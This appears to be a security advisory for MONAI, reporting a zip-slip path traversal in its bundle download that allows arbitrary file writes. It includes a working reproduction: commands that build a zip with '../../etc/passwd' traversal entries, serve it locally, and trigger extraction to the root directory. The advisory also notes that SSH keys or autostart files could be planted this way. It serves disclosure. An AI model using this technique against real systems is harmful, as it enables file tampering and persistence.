summary: "MONAI does not prevent path traversal, potentially leading to arbitrary file writes\n\
  ### Summary\nThe extractall function ```zip_file.extractall(output_dir)``` is used directly\
  \ to process compressed files. It is used in many places in the project. When the Zip file\
  \ containing malicious content is decompressed, it will overwrite the system files. In addition,\
  \ the project allows the download of the zip content through the link, which increases the\
  \ scope of exploitation of this vulnerability.\n\nWhen reproducing locally, follow the process\
  \ below to create a malicious zip file and simulate the process of remotely downloading the\
  \ zip file.\n```\nroot@autodl-container-a53c499c18-c5ca272d:~/autodl-tmp/mmm# mkdir -p test_bundle\n\
  root@autodl-container-a53c499c18-c5ca272d:~/autodl-tmp/mmm# echo \"malicious content\" > test_bundle/malicious.txt\
  \ \nroot@autodl-container-a53c499c18-c5ca272d:~/autodl-tmp/mmm# cd test_bundle  \nroot@autodl-container-a53c499c18-c5ca272d:~/autodl-tmp/mmm/test_bundle#\
  \ zip -r ../malicious.zip . ../../../../../../etc/passwd\n  adding: malicious.txt (stored\
  \ 0%)\n  adding: ../../../../../../etc/passwd (deflated 64%)\nroot@autodl-container-a53c499c18-c5ca272d:~/autodl-tmp/mmm/test_bundle#\
  \ cd ..\nroot@autodl-container-a53c499c18-c5ca272d:~/autodl-tmp/mmm# ls\nmalicious.zip  p1.py\
  \  p2.py  r1.py  test_bundle\n```\nThen start the http service through python\n```\nroot@autodl-container-a53c499c18-c5ca272d:~/autodl-tmp/mmm#\
  \ python -m http.server 8000\nServing HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...\n\
  ```\nAnother terminal simulates a normal user downloading zip content from the Internet, perhaps\
  \ from some popular forums or blogs, such as huggingface, etc.\n```\nroot@autodl-container-a53c499c18-c5ca272d:~/autodl-tmp/mmm#\
  \ python -c \"from monai.bundle.scripts import download; download(name='test_bundle', url='http://localhost:8000/malicious.zip',\
  \ bundle_dir='/tmp/test_extract')\"\n2025-08-11 20:49:01,668 - INFO - --- input summary of\
  \ monai.bundle.scripts.download ---\n2025-08-11 20:49:01,668 - INFO - > name: 'test_bundle'\n\
  2025-08-11 20:49:01,668 - INFO - > bundle_dir: '/tmp/test_extract'\n2025-08-11 20:49:01,668\
  \ - INFO - > source: 'monaihosting'\n2025-08-11 20:49:01,668 - INFO - > url: 'http://localhost:8000/malicious.zip'\n\
  2025-08-11 20:49:01,668 - INFO - > remove_prefix: 'monai_'\n2025-08-11 20:49:01,668 - INFO\
  \ - > progress: True\n2025-08-11 20:49:01,668 - INFO - ---\n\n\ntest_bundle.zip: 8.00kB [00:00,\
  \ 204kB/s]\n2025-08-11 20:49:01,710 - INFO - Downloaded: /tmp/test_extract/test_bundle.zip\n\
  2025-08-11 20:49:01,710 - INFO - Expected md5 is None, skip md5 check for file /tmp/test_extract/test_bundle.zip.\n\
  2025-08-11 20:49:01,710 - INFO - Writing into directory: /tmp/test_extract.\n2025-08-11 20:49:01,711\
  \ - WARNING - metadata file not found in /tmp/test_extract/test_bundle/configs/metadata.json.\n\
  root@autodl-container-a53c499c18-c5ca272d:~/autodl-tmp/mmm# ls /\nautodl-pub  cuda-keyring_1.0-1_all.deb\
  \  home  lib32   **malicious.txt**  opt   run   sys  var\nbin         dev                \
  \         init  lib64   media          proc  sbin  tmp\nboot        etc                  \
  \       lib   libx32  mnt            root  srv   usr\n```\nWe can see that malicious.txt was\
  \ indeed extracted to the root directory, demonstrating that the path traversal successfully\
  \ wrote the malicious file.\nIf the Zip file contains SSH keys, malicious content that automatically\
  \ loads when the user boots the computer, or overwrites legitimate user files, causing services\
  \ to become inoperable, these actions could cause extremely serious damage.\n\n### Impact\n\
  Arbitrary file write\n\n### Repair Suggestions\nCheck the contents of the downloaded Zip file,\
  \ or use a safer method to load it"
